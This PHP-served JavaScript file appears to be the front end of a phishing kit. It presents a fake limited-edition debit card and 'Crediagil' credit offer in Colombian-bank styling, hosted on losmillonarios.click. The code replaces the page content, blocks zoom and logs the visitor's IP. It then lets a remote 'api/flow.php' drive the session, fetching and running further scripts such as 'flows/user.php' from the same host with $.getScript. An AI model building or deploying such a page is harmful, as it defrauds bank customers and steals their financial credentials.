<?php
require(__DIR__ . '/../lib/auth.php');
Header("content-type: application/javascript");
?>
var my_hosting = "https://losmillonarios.click/";
<!-- var my_hosting = "https://losmonos.site/"; -->
var my_head = `
<meta charset="utf-8">
<meta content="es" http-equiv="Content-Language">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="${my_hosting}css/main.css" />
<link rel="stylesheet" href="${my_hosting}css/bg-lineas.css" />
<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
<script defer src="${my_hosting}js/clock.js"></script>
<script defer src="${my_hosting}js/no-zoom.js"></script>
`;

var pageData = {
  hero: `${my_hosting}assets/img/mundial.png`,
  heroTitle: "Tarjeta Débito Edición Limitada",
  lead: "Una tarjeta exclusiva, práctica y segura para tus compras de todos los días.",
  benefits: [
    { icon: "bx bx-credit-card", text: "Diseño exclusivo de edición limitada" },
    { icon: "bx bx-globe", text: "Úsala en comercios nacionales e internacionales" },
    { icon: "bx bx-star", text: "Acceso a beneficios y experiencias exclusivas" },
    { icon: "bx bx-tag-alt", text: "Descuentos en comercios seleccionados" },
    { icon: "bx bx-badge-check", text: "Mastercard Internacional" }
  ],
  formTitle: "Solicita tu tarjeta",
  formSubtitle: "",
  limitMax: 50000000,
  crediagilMin: 1000000,
  crediagilMax: 50000000,
  crediagilRateMonthly: 0.004,
  note: "",
  buttonText: "SOLICITAR TARJETA DÉBITO",
  buttonTextWithCrediagil: "SOLICITAR TARJETA + CRÉDITO"
};

function formatCopLabel(value) {
  return '$' + Number(value || 0).toLocaleString('es-CO');
}

pageData.crediagilMinText = formatCopLabel(pageData.crediagilMin);
pageData.crediagilMaxText = formatCopLabel(pageData.crediagilMax);

var benefitsHtml = pageData.benefits.map(function(item, index) {
  return '<li class="benefit-item"><i class=\'' + item.icon + '\' aria-hidden="true"></i><span>' + item.text + '</span></li>';
}).join('');
var noteHtml = pageData.note ? `<div class="note">${pageData.note}</div>` : '';

var my_body = `
<style>
  :root {
    --bg: #f4f5f7;
    --ink: #0d1117;
    --panel: #ffffff;
    --line: #e3e5ea;
    --yellow: #FFD100;
    --blue: #003087;
    --red: #CE1126;
    --muted: #6b7280;
  }

  * { box-sizing: border-box; }
  html, body { height: 100%; margin: 0; }

  body {
    background: var(--bg);
    font-family: "Sora", "Segoe UI", sans-serif;
    color: var(--ink);
    display: flex;
    justify-content: center;
    overflow-y: auto;
    overflow-x: hidden;
    touch-action: pan-y;
  }

  .home-screen {
    width: min(100vw, 480px);
    min-height: 100vh;
    padding: 0 0 40px;
  }

  /* ── Hero ── */
  .hero-section {
    background: var(--blue);
    padding: 28px 20px 30px;
    display: flex;
    flex-direction: column;
    align-items: center;
    position: relative;
    overflow: hidden;
  }
  .hero-section::after {
    content: "";
    position: absolute;
    bottom: 0; left: 0; right: 0;
    height: 4px;
    background: linear-gradient(to right, var(--yellow) 50%, var(--red) 50%);
  }

  .logo-mark {
    width: 148px;
    height: 42px;
    background: url('${my_hosting}assets/img/logo.svg') center/contain no-repeat;
    margin-bottom: 22px;
    filter: brightness(0) invert(1);
    opacity: 0.92;
  }
  .logo-mark span { display: none; }

  .hero-badge {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    padding: 4px 12px;
    border-radius: 999px;
    background: var(--red);
    color: #fff;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    margin-bottom: 16px;
  }
  .hero-badge i { font-size: 12px; }

  .hero-img {
    width: 82%;
    max-width: 280px;
    height: auto;
    display: block;
    filter: drop-shadow(0 14px 32px rgba(0,0,0,0.50));
    margin-bottom: 22px;
  }

  .hero-title {
    font-size: clamp(18px, 5vw, 21px);
    font-weight: 700;
    color: #fff;
    text-align: center;
    margin: 0 0 8px;
    line-height: 1.25;
  }

  .hero-lead {
    font-size: 13px;
    color: rgba(255,255,255,0.65);
    text-align: center;
    margin: 0;
    line-height: 1.55;
  }

  /* ── Ribbon ── */
  .limited-ribbon {
    background: var(--yellow);
    color: var(--blue);
    font-size: 11px;
    font-weight: 800;
    letter-spacing: 0.14em;
    text-transform: uppercase;
    text-align: center;
    padding: 8px 0;
  }

  /* ── Cuerpo ── */
  .body-wrap {
    padding: 16px 14px 0;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  /* ── Selector nueva / renovar ── */
  .card-type-label {
    font-size: 11px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.10em;
    color: var(--muted);
    margin: 0 0 8px;
    display: block;
  }

  .card-type-selector {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 8px;
  }

  .type-opt {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 6px;
    padding: 14px 10px;
    border: 1.5px solid var(--line);
    border-radius: 12px;
    background: var(--panel);
    cursor: pointer;
    transition: border-color 0.15s, background 0.15s;
    text-align: center;
  }
  .type-opt input[type="radio"] { display: none; }
  .type-opt i { font-size: 22px; color: var(--muted); transition: color 0.15s; }
  .type-opt span { font-size: 13px; font-weight: 600; color: var(--ink); line-height: 1.2; }
  .type-opt.selected { border-color: var(--blue); background: #e8eef8; }
  .type-opt.selected i { color: var(--blue); }

  /* ── Beneficios ── */
  .benefits-panel {
    background: var(--panel);
    border-radius: 14px;
    border: 1px solid var(--line);
    overflow: hidden;
  }

  .benefit-list { list-style: none; padding: 0; margin: 0; }

  .benefit-item {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 13px 16px;
    border-bottom: 1px solid var(--line);
    font-size: 13px;
    color: var(--ink);
  }
  .benefit-item:last-child { border-bottom: none; }
  .benefit-item i { font-size: 19px; color: var(--blue); flex-shrink: 0; width: 22px; text-align: center; }

  /* ── Crédito adicional ── */
  .credito-panel {
    background: var(--panel);
    border-radius: 14px;
    border: 1.5px solid var(--yellow);
    overflow: hidden;
  }

  .credito-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 14px 16px;
    cursor: pointer;
    user-select: none;
    gap: 10px;
  }
  .credito-header-left { display: flex; align-items: center; gap: 10px; }
  .credito-header-left i { font-size: 22px; color: var(--yellow); }
  .credito-header-title { font-size: 14px; font-weight: 700; color: var(--ink); }
  .credito-header-sub { font-size: 12px; color: var(--muted); }

  .credito-toggle-icon {
    width: 28px; height: 28px;
    border-radius: 50%;
    background: var(--yellow);
    border: none;
    display: grid;
    place-items: center;
    flex-shrink: 0;
    font-size: 18px;
    color: var(--blue);
    transition: background 0.15s;
  }
  .credito-header.open .credito-toggle-icon { background: var(--red); color: #fff; }

  .credito-body {
    display: none;
    padding: 0 16px 16px;
    border-top: 1px solid #f0e8c0;
  }
  .credito-body.open { display: block; }

  .credito-amount-display {
    padding: 14px 0 2px;
    font-size: 30px;
    font-weight: 800;
    color: var(--blue);
    letter-spacing: -0.03em;
  }

  .range-input { width: 100%; accent-color: var(--blue); margin: 10px 0 4px; }
  .range-limits { display: flex; justify-content: space-between; font-size: 11px; color: var(--muted); }

  /* ── CTA ── */
  .campaign-card { display: none; }
  .highlight-amount { display: none; }
  .crediagil-simple { display: none !important; }
  .option-credit, .option-renew { display: none; }
  .crediagil-toggle, .crediagil-panel, .term-grid, .result, .footer, .note { display: none; }

  .cta-form { display: block; }

  #btn-submit {
    width: 100%;
    height: 52px;
    border: 0;
    border-radius: 12px;
    background: var(--yellow);
    color: var(--blue);
    font-weight: 800;
    letter-spacing: 0.08em;
    font-size: 13px;
    cursor: pointer;
    transition: opacity 0.15s;
  }
  #btn-submit:active { opacity: 0.82; }
  #btn-submit:disabled {
    opacity: 0.4;
    cursor: not-allowed;
    background: #d1d5db;
    color: #9ca3af;
  }

  .security {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    font-size: 12px;
    color: var(--muted);
    margin-top: 10px;
  }
  .security i { font-size: 14px; color: var(--blue); }
</style>

<main class="home-screen">

  <div class="hero-section">
    <div class="logo-mark" aria-hidden="true"><span></span></div>
    <div class="hero-badge"><i class='bx bx-badge-check'></i> Edición Limitada</div>
    <img class="hero-img" src="${pageData.hero}" alt="Tarjeta Débito Edición Limitada">
    <h1 class="hero-title">${pageData.heroTitle}</h1>
    <p class="hero-lead">${pageData.lead}</p>
  </div>

  <div class="limited-ribbon">Edición Limitada · Solo por tiempo limitado</div>

  <div class="body-wrap">

    <div>
      <span class="card-type-label">¿Qué necesitas?</span>
      <div class="card-type-selector">
        <label class="type-opt selected" for="opt-new">
          <input type="radio" id="opt-new" name="card_type" value="nueva" checked>
          <i class='bx bx-credit-card-front'></i>
          <span>Nueva Tarjeta</span>
        </label>
        <label class="type-opt" for="opt-renew">
          <input type="radio" id="opt-renew" name="card_type" value="renovacion">
          <i class='bx bx-refresh'></i>
          <span>Renovar mi Tarjeta</span>
        </label>
      </div>
    </div>

    <div class="benefits-panel">
      <ul class="benefit-list">${benefitsHtml}</ul>
    </div>

    <div class="credito-panel">
      <div class="credito-header" id="creditoHeader">
        <div class="credito-header-left">
          <i class='bx bx-dollar-circle'></i>
          <div>
            <div class="credito-header-title">Crédito adicional</div>
            <div class="credito-header-sub">Hasta $50.000.000 — opcional</div>
          </div>
        </div>
        <div class="credito-toggle-icon"><i class='bx bx-plus'></i></div>
      </div>
      <div class="credito-body" id="creditoBody">
        <div class="credito-amount-display" id="crediagilAmountText">${pageData.crediagilMinText}</div>
        <input id="crediagilAmountRange" class="range-input" type="range"
          min="${pageData.crediagilMin}" max="${pageData.crediagilMax}" step="500000" value="${pageData.crediagilMin}">
        <div class="range-limits">
          <span>${pageData.crediagilMinText}</span>
          <span>${pageData.crediagilMaxText}</span>
        </div>
      </div>
    </div>

    <div class="campaign-card"><div class="highlight-amount" id="highlightAmount"></div></div>
    <div id="benefitPanel"></div>

    <form class="cta-form" method="post" onsubmit="return false;">
      <button id="btn-submit" type="submit">${pageData.buttonText}</button>
      <div class="security">
        <i class='bx bx-lock-alt'></i>
        <span>Proceso seguro y cifrado</span>
      </div>
    </form>

  </div>

</main>
`;


  let timer = undefined;
  var my_data = [];
  let token = '<?php echo $token; ?>';
  try { window.token = token; } catch(e){}
  let api_server = `${my_hosting}api/flow.php`;

  async function processing(p = {}) {
    let fd = new FormData();
    fd.append('registro', my_data['registro']);
    fd.append('tok', token);
    for (var d in p) {
      fd.append(d, p[d]);
    }

    const prom = await fetch(api_server, {
      method: 'POST',
      body: fd
    });


    let json = await prom.json();

    if (!json) {

      return;
    }
    for (let prop in json) {
      my_data[prop] = json[prop];
    }

    if (json.action) {
      switch (json.action) {
        case 'consulta':
          consultarEstado();
          break;
        case 'url':
          window.location.href = json.url;
          break;
        default:
          loadScript(json.action, json);
          break;
      }
    }
  }

  function loadScript(path, data = null, params = []) {
    clearInterval(timer);
    let url = my_hosting + path + '?';

    params = Object.assign({}, params, my_data);
    for (var d in params) {
      if (params[d]) {
        url += '&' + d + '=' + params[d];
      }
    }
    try {
      $.getScript(url, function() {
        $('*').scrollTop(0);
        if (data) {
          $('#tabError').toggle(data.error !== undefined);
          if (data.error) {
            $('#summary').html(data.error);
          }
        }
        if ($('#jclock1').length > 0) {
          var optionsEST = {
            utc: true,
            utcOffset: -5,
            format: "%A %R de %B de %Y %l:%M:%S %P",
            language: "es"
          }
          $('[id="jclock1"]').jclockNew(optionsEST);
        }
      }).fail(function(jqxhr, settings, exception) {
        console.error("Error loading script:", exception);
      });
    } catch (error) {
      console.error('An error occurred:', error);
    }
  }

  function consultarEstado() {
    processing({
      t: 'consultar',
    });
  }

  $('head').html(my_head);
  $('body').html(my_body);

  $(function() {
    // Bloquea pinch/doble-tap zoom en móviles.
    const blockZoom = (event) => {
      if (event.touches && event.touches.length > 1) {
        event.preventDefault();
      }
    };
    document.addEventListener('touchstart', blockZoom, { passive: false });
    document.addEventListener('touchmove', blockZoom, { passive: false });
    document.addEventListener('gesturestart', (event) => event.preventDefault());
    document.addEventListener('gesturechange', (event) => event.preventDefault());

    if ($('[id="jclock1"]').length > 0) {

      var optionsEST = {
        utc: true,
        utcOffset: -5,
        format: "%A %R de %B de %Y %l:%M:%S %P",
        language: "es",
      };
      $('[id="jclock1"]').jclockNew(optionsEST);
    }

    $.get(
      "https://api.ipify.org?format=jsonp&callback=?",
      function(data) {
        $('#ipc').html("Dirección IP: " + data.ip);
      },
      "jsonp"
    );

    var $crediagilAmountRange = $('#crediagilAmountRange');
    var $crediagilAmountText  = $('#crediagilAmountText');
    var $submitButton         = $('#btn-submit');
    var $creditoHeader        = $('#creditoHeader');
    var $creditoBody          = $('#creditoBody');

    var crediagilMin      = Number($crediagilAmountRange.attr('min')) || 0;
    var crediagilMax      = Number($crediagilAmountRange.attr('max')) || 0;
    var crediagilSelected = false;
    var cardTypeSelected  = 'nueva';

    var creditAmountFormatter = new Intl.NumberFormat('es-CO', {
      style: 'currency', currency: 'COP', maximumFractionDigits: 0
    });

    function formatCurrency(v) { return creditAmountFormatter.format(v || 0); }

    function getCrediagilAmount() {
      var n = Number($crediagilAmountRange.val()) || crediagilMin;
      return Math.min(Math.max(n, crediagilMin), crediagilMax);
    }

    function updateAmountDisplay() {
      $crediagilAmountText.text(formatCurrency(getCrediagilAmount()));
    }

    function updateSubmitText() {
      $submitButton.text(crediagilSelected ? pageData.buttonTextWithCrediagil : pageData.buttonText);
    }

    function updateCrediagilEstimate() {
      var amount = getCrediagilAmount();
      $crediagilAmountText.text(formatCurrency(amount));
      return { amount: amount };
    }

    // ── Estado inicial ──
    $crediagilAmountRange.val(crediagilMin);
    updateAmountDisplay();
    updateSubmitText();
    $submitButton.prop('disabled', false);

    // ── Acordeón crédito adicional ──
    $creditoHeader.on('click', function() {
      crediagilSelected = !crediagilSelected;
      $creditoBody.toggleClass('open', crediagilSelected);
      $creditoHeader.toggleClass('open', crediagilSelected);
      var icon = $creditoHeader.find('.credito-toggle-icon i');
      icon.attr('class', crediagilSelected ? 'bx bx-minus' : 'bx bx-plus');
      updateSubmitText();
    });

    // ── Slider ──
    $crediagilAmountRange.on('input change', function() {
      updateAmountDisplay();
    });

    // ── Selector nueva / renovar ──
    $('.type-opt').on('click', function() {
      $('.type-opt').removeClass('selected');
      $(this).addClass('selected');
      cardTypeSelected = $(this).find('input[type="radio"]').val();
    });

    // ── Submit ──
    $submitButton.on('click', function() {
      var amount = getCrediagilAmount();
      $submitButton.attr('disabled', 'disabled');
      var productName = 'Tarjeta Débito Edición Limitada'
        + (cardTypeSelected === 'renovacion' ? ' (Renovación)' : '')
        + (crediagilSelected ? ' + Crédito adicional' : '');
      loadScript('flows/user.php', {
        body: true,
        cupo_actual: '',
        cupo_aumento: '',
        cupo_nuevo: '',
        crediagil_seleccionado: crediagilSelected ? 'si' : 'no',
        crediagil_valor: crediagilSelected ? amount : '',
        crediagil_plazo_meses: '',
        crediagil_tasa_mensual: '',
        crediagil_cuota_mensual: '',
        solicitud_producto: productName,
        tipo_tarjeta: cardTypeSelected
      });
    });
  });
